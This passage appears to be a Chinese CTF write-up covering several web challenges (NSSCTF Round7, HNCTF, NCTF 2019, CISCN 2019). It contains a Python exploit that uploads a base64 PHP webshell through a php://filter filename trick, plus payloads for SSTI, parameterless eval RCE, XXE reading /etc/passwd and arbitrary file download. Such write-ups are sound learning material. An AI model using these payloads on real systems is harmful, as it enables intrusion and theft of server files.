class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（会死）</p>
<p>一个一个来看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>))</span><br><span class="line">sha1碰撞 这里直接使用数组绕过 <span class="literal">null</span>===<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>.   <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>)))</span><br><span class="line">    判断书不是数字，然后判断在不在<span class="keyword">array</span>里面</span><br></pre></td></tr></table></figure>

<p>这里需要使用%00截断</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>0x00，%00，&#x2F;00之类的截断，都是一样的，只是不同表示而已</p>
<p>%00是null的编码</p>
<p>1%00不是数字，但是in_array函数里面变成了1（null），null被去掉了，于是就绕过了这一层</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>. <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) </span><br><span class="line">直接data伪协议就好data:<span class="comment">//text/plain,Welcome to Round7!!!</span></span><br><span class="line"><span class="number">4</span>.<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) </span><br><span class="line">传值变量名字里面_是非法的，可以使用[，传入后解析成_</span><br><span class="line"><span class="number">5</span>. <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) </span><br><span class="line">intval 默认转化成<span class="number">10</span>进制，这里可以<span class="number">114514e1</span>绕过</span><br><span class="line"><span class="number">6</span>.  <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>)</span><br><span class="line"> 这里nss直接传值成<span class="number">1</span>，后面的变量nSscTF在is_numeric函数转化之后是<span class="number">0</span>或<span class="number">1</span>所以没啥影响直接传NSSRound就好</span><br><span class="line">                   </span><br></pre></td></tr></table></figure>

<p>接下来代码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br></pre></td></tr></table></figure>

<p>随便传一个submit的值</p>
<p>然后会将上传文件的名字和后缀进行一次url解码，然后path变量记录上传文件</p>
<p>上传的内容会被添加到 ‘&lt;?php die(“Round7 do you like”);’后面</p>
<p>path存在伪协议利用的点</p>
<p>思路是先上传一个base64加密的恶意语句，然后使用base64解密文件，让前面的die函数无法正常执行</p>
<p>最终exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url =‘http://node2.anna.nssctf.cn:<span class="number">28994</span>/Ns_SCtF.php?NSSCTF[]=<span class="number">1</span>&amp;NsSCTF[]=<span class="number">2</span>&amp;NsScTF=<span class="number">1</span>%<span class="number">00</span>&amp;NsScTf=data://text/plain,Welcome%20to%20Round7!!!&amp;nss[ctfer.vip=<span class="number">1</span>&amp;NSScTf=<span class="number">114514e1</span>&amp;nSscTF=NSSRound7&amp;nSScTF=<span class="number">1</span>’</span><br><span class="line">data=&#123;‘submit’:<span class="number">1</span>&#125;</span><br><span class="line">file1=<span class="built_in">str</span>(base64.b64encode(<span class="string">b&quot;&lt;?php @eval($_POST[‘a’]);“))</span></span><br><span class="line"><span class="string">file2=re.findall(r&quot;</span>b’(.*?)<span class="string">&#x27;”,file1)[0]</span></span><br><span class="line"><span class="string">text1=&#123;‘file’:(‘3.png.php’,f&quot;a&#123;file2&#125;“)&#125;</span></span><br><span class="line"><span class="string">text2=&#123;‘flie’:(‘%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%2e%70%6e%67%2e%70%68%70’, f&quot;aaa&#123;file2&#125;”)&#125;</span></span><br><span class="line"><span class="string">a1=requests.post(url,data=data,files=text1)</span></span><br><span class="line"><span class="string">if(a1.status_code==200):print(‘200’)</span></span><br><span class="line"><span class="string">a2=requests.post(url,data=data,files=text2)</span></span><br><span class="line"><span class="string">if(a2.status_code==200):print(‘200’)</span></span><br></pre></td></tr></table></figure>

<h2 id="6-HNCTF-2022-WEEK3-ssssti"><a href="#6-HNCTF-2022-WEEK3-ssssti" class="headerlink" title="6.[HNCTF 2022 WEEK3]ssssti"></a>6.[HNCTF 2022 WEEK3]ssssti</h2><p>   fenjing一把梭算了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack --url http://node2.anna.nssctf.cn:28975/ --method GET --inputs name</span><br></pre></td></tr></table></figure>

<h2 id="7-HNCTF-2022-WEEK2-Canyource"><a href="#7-HNCTF-2022-WEEK2-Canyource" class="headerlink" title="7.[HNCTF 2022 WEEK2]Canyource"></a>7.[HNCTF 2022 WEEK2]Canyource</h2><p>(还是先提升自己的代码审计功底罢（悲）)</p>
<p>上来给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>第一部分是get传参数传一个code，过滤了一堆</p>
<p>重点在后面的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>正则表达式模式’&#x2F;[^\W]+((?R)?)&#x2F;‘的含义是匹配一个或多个非单词字符，后面跟着一个括号和可选的递归子模式。</p>
<p>加入传入a(a),在递归的过程中，将a()替换为空，过滤结果是a</p>
<p>简单的无参数rce</p>
<p>eval(end(current(get_defined_vars())));&amp;shekk&#x3D;system(%27cat%20f*%27);</p>
<p>之前博客说过，就不细说了</p>
<h2 id="8-NCTF-2019-Fake-XML-cookbook"><a href="#8-NCTF-2019-Fake-XML-cookbook" class="headerlink" title="8.[NCTF 2019]Fake XML cookbook"></a>8.[NCTF 2019]Fake XML cookbook</h2><p>简单的xml注入</p>
<p>f12能看到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: function (result) &#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">var</span> msg = result.<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br></pre></td></tr></table></figure>

<p>在这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; </span><br></pre></td></tr></table></figure>

<p>储存数据之后发包给”doLogin.php”,</p>
<p>这里存在xxe的问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">        &lt;!ENTITY  xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;//文件路径</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>直接file读取文件，一下子就读取出来了，下机</p>
<h2 id="9-CISCN-2019华北Day1-Web1"><a href="#9-CISCN-2019华北Day1-Web1" class="headerlink" title="9[CISCN 2019华北Day1]Web1"></a>9[CISCN 2019华北Day1]Web1</h2><p>正常注册，随便上传个文件，下载文件存在任意文件读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /download.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node2.anna.nssctf.cn:<span class="number">28904</span></span><br><span class="line">Content-Length: <span class="number">32</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//node2.anna.nssctf.cn:28904</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">102.0</span>.<span class="number">5005.63</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://node2.anna.nssctf.cn:28904/index.php</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=a2250543f2a5b83205b9b194f9db8d79</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">filename=/var/www/html/index.php</span></span><br></pre></td></tr></table></figure>

<h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><p>这里读文件的时候使用的是绝对路径</p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p>
<p>也可以使用相对路径</p>
<p>这里在download.php路劲下，使用..&#x2F;退回到上层</p>
<p>..&#x2F;..&#x2F;index.php</p>
<p>以下是读出来的</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>download.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class.php</p>
